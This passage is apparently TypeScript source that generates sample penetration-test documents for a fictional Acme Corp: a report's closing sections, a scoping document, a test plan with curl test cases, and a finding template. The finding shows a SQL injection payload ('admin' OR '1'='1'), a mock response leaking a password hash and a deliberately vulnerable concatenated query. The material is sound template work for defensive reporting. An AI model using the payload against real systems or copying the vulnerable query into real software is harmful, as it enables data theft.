The application does not set \`X-Frame-Options\`, \`X-Content-Type-Options\`, or
\`Strict-Transport-Security\` headers. The absence of these headers enables clickjacking,
MIME-sniffing attacks, and downgrades from HTTPS to HTTP.
:::

# Post-Exploitation

Using the administrative session obtained via the SQL injection vulnerability (PT-001),
post-exploitation activity was conducted within the authorized scope defined in the rules
of engagement. All actions were performed against the designated test environment and no
production data was accessed or retained.

## Actions Performed

- Dumped the application's user table: 12,483 records including email addresses, bcrypt password hashes, phone numbers, and home addresses
- Accessed the administrative panel via a combination of IDOR (PT-003) and Stored XSS (PT-002) to demonstrate session hijacking
- Read server environment variables from the exposed metrics endpoint on port 8080, obtaining the production database connection string and JWT signing secret

${imgPlaceholder("Screenshot — Database dump showing user credential exposure")}

# Recommendations

## Immediate (Halt Production)

The combination of authentication bypass (PT-001) and arbitrary data access (PT-003)
means all user data in the system should be considered compromised. Remediation of
PT-001, PT-002, and PT-003 must be completed and independently verified before the
application handles production data.

## Remediation Priority

| Finding | Remediation | Effort | Priority |
|---------|-------------|--------|----------|
| PT-001 | Parameterized queries throughout ORM layer | Medium | [Immediate]{.priority-immediate} |
| PT-002 | Output encoding + Content-Security-Policy header | Low | [Immediate]{.priority-immediate} |
| PT-003 | Ownership assertion middleware on all user routes | Low | [Immediate]{.priority-immediate} |
| PT-004 | Outbound request allowlist; block RFC-1918 ranges | Medium | [Short-term]{.priority-short-term} |
| PT-005 | Block \`.git/\` at web server level (nginx/Apache config) | Low | [Short-term]{.priority-short-term} |
| PT-006 | Add helmet.js for security header enforcement | Low | [Short-term]{.priority-short-term} |

## Verification

Intelligence Adjacent recommends a retest of all P0 and P1 findings following remediation
to confirm effective resolution before production deployment. A full re-assessment is
recommended within 90 days of the initial fix deployment.

# Appendices

## Rules of Engagement

Testing was authorized by written agreement (SOW-2026-014) signed by Acme Corp on
2026-02-10. Scope was limited to the three specified hostnames. Destructive testing,
denial-of-service, and access to production data were explicitly prohibited.

## CVSS Scores

| Finding | Vector | Score | Severity |
|---------|--------|-------|----------|
| PT-001 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | [Critical]{.badge-critical} |
| PT-002 | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N | 8.2 | [High]{.badge-high} |
| PT-003 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 7.5 | [High]{.badge-high} |
| PT-004 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N | 7.3 | [High]{.badge-high} |
| PT-005 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | [Medium]{.badge-medium} |
| PT-006 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 | [Medium]{.badge-medium} |

## Tools Used

- Nmap (port scanning and service enumeration)
- Feroxbuster (directory and parameter enumeration)
- Burp Suite Professional (manual testing and HTTP interception)
- sqlmap (SQL injection verification)
- OWASP ZAP (automated scanning)
- Manual review and custom payloads
`;
}

// ─── Scoping Document ───────────────────────────────────────────────────────

function scopingBody(logo: string | null, d: ReportDefaults): string {
  const reviewer = d.reviewerOrg ?? "Intelligence Adjacent";
  return `
::: {.report-header}
${logoLine(logo)}
# Scoping Document {.unnumbered .unlisted}
<span class="report-target">Engagement Scope</span>

::: {.report-header-meta}
<span><span class="meta-label">Engagement ID</span>ENG-2026-001</span>
<span><span class="meta-label">Date</span>2026-03-01</span>
<span><span class="meta-label">Status</span>Draft</span>
<span><span class="meta-label">Client</span>Acme Corp</span>
:::
:::

# Client & Authorization

| Field | Value |
|-------|-------|
| **Client** | Acme Corporation |
| **Contact** | John Smith, john@acme.com |
| **Authorization Basis** | Signed SOW |
| **SOW Reference** | SOW-2026-001 |

# Scope Definition

## In-Scope Assets

| Asset ID | Type | Identifier | Description |
|----------|------|------------|-------------|
| WEB-001 | Web Application | https://app.acme.com | Main application |
| API-001 | API | https://api.acme.com | REST API |
| MOB-001 | Mobile | com.acme.app | iOS/Android app |

## Out-of-Scope

| Asset/Activity | Reason |
|----------------|--------|
| Staging environment | Not authorized |
| Third-party integrations | External services |

## Constraints

- **Testing Window:** Mon-Fri, 9AM-5PM EST
- **Rate Limits:** 100 requests/minute
- **Restrictions:** No DoS testing

# Technical Details

- **Testing Domains:** Web Application, API, Mobile
- **Methodology:** OWASP Top 10, MITRE ATT&CK

## Asset Distribution

${flowChart("flowchart TB\n" +
"  User[User Traffic] --> LB[Load Balancer]\n" +
"  LB --> Web[Web App]\n" +
"  LB --> API[API Gateway]\n" +
"  API --> Svc1[Auth Service]\n" +
"  API --> Svc2[User Service]\n" +
"  API --> DB[(Database)]\n" +
"  Web --> Mob[Mobile App]")}

${imgPlaceholder("Screenshot — Asset inventory spreadsheet or scope matrix")}

# Access & Credentials

- [ ] VPN/Network access
- [x] Source code access
- [ ] Cloud console access
- Test accounts: 3 (admin, user, test)

# Standards & Frameworks

- [x] OWASP Top 10
- [x] CWE Top 25
- [ ] MITRE ATT&CK

# Deliverables

| Deliverable | Format |
|-------------|--------|
| Final Report | Markdown/HTML |
| Findings | Markdown |

# Approval

| | |
|---|---|
| **Client Representative** | _________________________________ |
| **Date** | [Date] |
`;
}

// ─── Test Plan ────────────────────────────────────────────────────────────

function testplanBody(logo: string | null, d: ReportDefaults): string {
  const reviewer = d.reviewerOrg ?? "Intelligence Adjacent";
  return `
::: {.report-header}
${logoLine(logo)}
# Test Plan {.unnumbered .unlisted}
<span class="report-target">Engagement Test Plan</span>

::: {.report-header-meta}
<span><span class="meta-label">Engagement ID</span>ENG-2026-001</span>
<span><span class="meta-label">Date</span>2026-03-01</span>
<span><span class="meta-label">Status</span>Pending Approval</span>
<span><span class="meta-label">Reference</span>scoping-document.md</span>
:::
:::

# Plan Overview

## Scope Summary

- **Assets in Scope:** 3
- **Engagement Type:** External Pentest
- **Methodology:** OWASP Top 10, MITRE ATT&CK

## Objectives

1. Identify security vulnerabilities in web application
2. Validate security controls
3. Provide remediation guidance

# Test Approach

| Domain | Approach | Framework |
|--------|----------|-----------|
| Web Application | Manual + Automated | OWASP Top 10 |
| API | Manual + Automated | OWASP API Top 10 |
| Mobile | Manual | MASVS |

## Coverage Matrix

${riskChart([["Web App", 45], ["API", 30], ["Mobile", 15], ["Setup", 10]], { high: "#4A90E2", medium: "#EA580C", low: "#16A34A", critical: "#7C3AED" })}

${imgPlaceholder("Screenshot — Full test case matrix or coverage map")}

# Test Cases

## Domain: Web Application

### Test Case: Authentication

- **Objective:** Test authentication mechanisms
- **Framework:** OWASP A07
- **Steps:**
  \`\`\`
  curl -X POST https://app.acme.com/login -d "user=admin&pass=test"
  \`\`\`
- **Expected:** Secure authentication enforced

### Test Case: Access Control

- **Objective:** Test authorization checks
- **Framework:** OWASP A01
- **Steps:**
  \`\`\`
  curl -X GET https://app.acme.com/api/user/2/profile -H "Authorization: Bearer $TOKEN"
  \`\`\`
- **Expected:** 403 Forbidden for unauthorized access

## Domain: API

### Test Case: BOLA

- **Objective:** Test object-level authorization
- **Framework:** OWASP API1
- **Steps:**
  \`\`\`
  curl -X GET https://api.acme.com/v1/users/2 -H "Authorization: Bearer $USER_A_TOKEN"
  \`\`\`
- **Expected:** Access denied

# Tools Required

| Tool | Purpose | Available |
|------|---------|-----------|
| Burp Suite | Web testing | Yes |
| Nmap | Network scanning | Yes |
| Semgrep | Static analysis | Yes |

# Timeline

| Phase | Duration |
|-------|----------|
| Setup | 2 hours |
| Execution | 24 hours |
| Documentation | 8 hours |
| **Total** | **34 hours** |

# Approval

| | |
|---|---|
| **Status** | [ ] Approved for Execution |
| **Lead Tester** | _________________________________ |
| **Date** | [Date] |
`;
}

// ─── Finding Template ───────────────────────────────────────────────────────
// Just a single finding block - same format as in full reports

function findingBody(logo: string | null, d: ReportDefaults): string {
  return `
::: {.finding-high}
#### ENG-001: SQL Injection in User Search

**Severity:** [High]{.badge-high} | **Priority:** P1 | **Confidence:** HIGH

**CWE:** CWE-89 | **OWASP:** A03:2021 — Injection

**Location:** \`https://api.acme.com/api/user/search\`

**Status:** Open

---

## Description

The /api/v1/users/search endpoint is vulnerable to SQL injection due to insufficient input sanitization. The query parameter is directly concatenated into a SQL statement without proper escaping.

## Affected Components

Endpoint: \`POST /api/user/search\`
Parameter: \`query\` (POST body)
File: \`src/handlers/user.ts:47\`

\`\`\`typescript
// VULNERABLE
const query = "SELECT * FROM users WHERE name LIKE '%" + req.body.query + "%'";
\`\`\`

## Root Cause

An unauthenticated attacker can extract the entire user database, including password hashes. This enables full account takeover.
\`\`\`

**Evidence**

\`\`\`http
POST /api/user/search HTTP/1.1
Host: api.acme.com
Content-Type: application/json

{"query": "admin' OR '1'='1"}

HTTP/200 OK
{"users": [{"id":1,"email":"admin@acme.com","password_hash":"$2b$12$..."}, ...]}
\`\`\`

**Remediation**

Use parameterized queries:

\`\`\`typescript
const query = "SELECT * FROM users WHERE name LIKE ?";
db.execute(query, [\`%\${req.body.query}%\`]);
\`\`\`
:::
`;
}

export function previewQmd(
  theme: string, type: PreviewType, frameworkRoot: string, defaults: ReportDefaults = {}, draft = false
): string {
  const title = TYPE_TITLES[type];
  const logo  = findLogo(frameworkRoot);
  const fm    = frontmatter(theme, frameworkRoot, title, draft);
  switch (type) {
    case "sec-review": return fm + secReviewBody(logo, defaults);
    case "pentest":    return fm + pentestBody(logo, defaults);
    case "scoping":    return fm + scopingBody(logo, defaults);
    case "testplan":   return fm + testplanBody(logo, defaults);
    case "finding":    return fm + findingBody(logo, defaults);
    default:           return fm + codeReviewBody(logo, defaults);
  }
}
